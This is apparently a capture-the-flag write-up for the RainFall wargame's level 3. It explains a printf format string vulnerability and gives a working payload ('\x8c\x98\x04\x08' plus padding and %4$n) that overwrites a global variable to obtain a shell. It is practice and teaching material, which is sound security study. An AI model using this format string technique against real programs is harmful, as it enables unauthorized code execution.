Level 3 Format String Vulnerability
-------

1) We found a file ./level3
---------------------------

level3@RainFall:~$ ls
level3
level3@RainFall:~$ ./level3 
wdwd
wdwd

when we run it with gdb we can see that the "main" function is calling a "v" function 

Inside the v() function we found the Vulnerable line, which is 


"printf(buffer);"       Instead of:       "printf("%s", buffer);"

This means:  User controls the format string.
This is a format string vulnerability.

2) Lets attack the unsafe part of this program "printf"
------------------------------------------------------

level3@RainFall:~$ python -c 'print "aaaa %x %x %x %x %x %x %x %x %x %x"' | ./level3

aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078

Our input is located in offset 4 (61616161) so offset = 4


2_1)   

Now let's place the address of 0x0804988c inside the stack. why this address because we found that this is the address that is being compared in the function v() 
the address of m 

test:

level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' | ./level3
� 200 b7fd1ac0 b7ff37d0 804988c

argument 1 → 200
argument 2 → b7fd1ac0
argument 3 → b7ff37d0
argument 4 → 0x0804988c   ← our injected address


we can see that the address is located in the the argument 4, and we refer to it by %4$

2_2)

example to explain the %n

int x = 0;
printf("Hello%n", &x);

What happens?  "Hello" prints 5 characters /////  %n stores 5 into x
After execution: x = 5

THe 4th argument on the stack = 0x0804988c and 0x0804988c = \x8c\x98\x04\x08" in little endian

Adding "A"*60 , Now we have 64 

"%4$n" 
% start of format specifier
4$ Use the 4th argument on the stack
n Do NOT print. Write number of printed characters so far into the address provided by argument #4.


(python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"'; cat) | ./level3

\x8c\x98\x04\x08   → address to overwrite
"A"*60             → padding
%4$n               → write operation

2_3) conclusion

\x8c\x98\x04\x08 → puts the address of m (0x0804988c) on the stack as the 4th argument.

"A"*60 → pads the output so that total printed characters = 64.

%4$n → tells printf:

Take the 4th argument, treat it as a pointer, and write the number of printed characters so far (64) into it.

Program sees that m == 64 → triggers the conditional → calls system("/bin/sh").